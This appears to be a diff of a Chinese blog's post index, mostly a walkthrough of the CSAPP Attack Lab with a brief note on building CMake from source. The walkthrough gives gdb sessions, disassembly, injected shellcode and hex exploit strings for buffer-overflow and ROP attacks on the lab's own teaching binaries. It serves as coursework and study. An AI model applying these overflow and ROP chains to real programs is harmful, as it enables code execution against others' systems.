+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image10.png"></p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
+<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
+<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>
+
+<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
+<ul>
+<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
+</li>
+<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
+</li>
+<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
+</li>
+<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
+</li>
+</ul>
+<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h5 id="1-将-rsp传给-rdi"><a href="#1-将-rsp传给-rdi" class="headerlink" title="1. 将%rsp传给%rdi"></a>1. 将<code>%rsp</code>传给<code>%rdi</code></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
+<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
+<h5 id="2-将偏移传给-rsi"><a href="#2-将偏移传给-rsi" class="headerlink" title="2. 将偏移传给$rsi"></a>2. 将偏移传给<code>$rsi</code></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>
+
+<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
+<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
+<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
+<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
+<h5 id="3-将cookie字符串传给-rdi"><a href="#3-将cookie字符串传给-rdi" class="headerlink" title="3. 将cookie字符串传给%rdi"></a>3. 将<code>cookie</code>字符串传给<code>%rdi</code></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
+<h5 id="4-将-rax传给-rdi"><a href="#4-将-rax传给-rdi" class="headerlink" title="4. 将%rax传给$rdi"></a>4. 将<code>%rax</code>传给<code>$rdi</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
+<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
+<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
+<p>输入的字符串如下：</p>
+<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image11.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
+<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
+<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
+<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
+]]></content>
+      <categories>
+        <category>CSAPP</category>
+      </categories>
+      <tags>
+        <tag>CSAPP</tag>
       </tags>
   </entry>
   <entry>
@@ -640,219 +851,8 @@
         <category>CSAPP</category>
       </categories>
       <tags>
+        <tag>CSAPP</tag>
         <tag>Assembly</tag>
-        <tag>CSAPP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>源码编译并安装CMake</title>
-    <url>/2020/07/26/2020-07-26-how-to-compile-and-install-cmake/</url>
-    <content><![CDATA[<p>从官网安装指定版本， 以<code>3.12.1</code>版本为例：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.12/cmake-3.12.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.12.1.tar.gz</span><br><span class="line">cd cmake-3.12.1</span><br><span class="line">./bootstrap</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-
-<p>查看cmake版本，检查是否安装成功</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmake --version</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CMake</category>
-      </categories>
-      <tags>
-        <tag>CMake</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSAPP 缓冲区溢出实验</title>
-    <url>/2020/08/02/2020-08-02-csapp-buflab/</url>
-    <content><![CDATA[<h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
-<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
-<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
-</li>
-<li><p><code>gdb</code>和<code>objdump</code>使用</p>
-</li>
-<li><p>x86_64下的汇编</p>
-</li>
-</ul>
-<span id="more"></span>
-
-<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
-<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
-<ul>
-<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
-</li>
-<li><p><code>rtarget</code>：ROP攻击的程序。</p>
-</li>
-<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
-</li>
-<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
-</li>
-<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
-</li>
-</ul>
-<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
-<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
-<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
-<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
-<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>
-
-<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>
-
-<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
-<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
-
-<p>构造攻击字符串, 写到文件<code>hex1</code></p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>
-
-<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
-<ul>
-<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
-</li>
-<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
-</li>
-<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
-</li>
-</ul>
-<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>
-
-<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
-<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
-<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>综上，得到我们需要输入的字符串</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image3.png"></p>
-<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><code>touch3</code>代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
-<ul>
-<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
-</li>
-<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
-</li>
-<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
-</li>
-</ul>
-<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>
-
-<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>我第一次写这块汇编代码时，犯了两个错误：</p>
-<ul>
-<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
-</li>
-<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
-</li>
-</ul>
-<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
-<p>综上，得到我们需要输入字符串</p>
-<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
-
-<p>此时的栈组织如下：<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image4.png"></p>
-<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
-<ul>
-<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
-<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
-</ul>
-<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
-<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>
-
-<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
-<ul>
-<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
-<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image6.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image7.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image8.png"><br><img data-src="/2020/08/02/2020-08-02-csapp-buflab/image9.png"></li>
-</ul>
-<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
-<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>
-
